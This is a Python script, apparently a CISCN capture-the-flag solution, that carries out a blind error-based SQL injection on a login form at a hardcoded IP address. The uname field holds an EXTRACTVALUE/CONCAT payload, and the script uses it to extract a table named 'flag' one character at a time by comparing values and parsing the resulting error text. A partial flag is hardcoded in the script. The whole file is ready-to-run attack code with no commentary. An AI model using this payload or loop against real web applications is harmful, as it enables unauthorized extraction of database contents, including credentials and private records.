import requests
import time
url = 'http://123.60.211.115:21391/index.php'
flag = 'CISCN{U42OT-PWPPY-IGMEO-CYKUL-0HV51-'
# flag = ''


for i in range(1,200):
    for char in range(32, 256):
        # if not chr(char).isprintable():
        #     continue
        hexchar = flag + chr(char)
        
        buff = f"select (select 1,'no','{hexchar}')>(select * from flag)"
        payload = "KGwv') AND EXTRACTVALUE(2861,CONCAT(0x5c,(" + buff + "),0x5c))-- "
        data = {'uname': payload, 'passwd': '', 'Submit': '%E7%99%BB%E5%BD%95'}
        r = requests.post(url=url, data=data)
        # print(r.text)
        if '\\1\\' in r.text:
            flag += chr(char - 1)
            print(flag)
            break
        elif 'syntax' in r.text:
            # print(r.text)
            hexchar = flag + '\\' + chr(char)
            buff = f"select (select 1,'no','{hexchar}')>(select * from flag)"
            payload = "KGwv') AND EXTRACTVALUE(2861,CONCAT(0x5c,(" + buff + "),0x5c))-- "
            data = {'uname': payload, 'passwd': '', 'Submit': '%E7%99%BB%E5%BD%95'}
            r = requests.post(url=url, data=data)
            # print(r.text)
            if '\\1\\' in r.text:
                flag += chr(char - 1)
                print(flag)
                break
        # time.sleep(0.1)
        if char == 255:
            print("fail")
            exit(0)
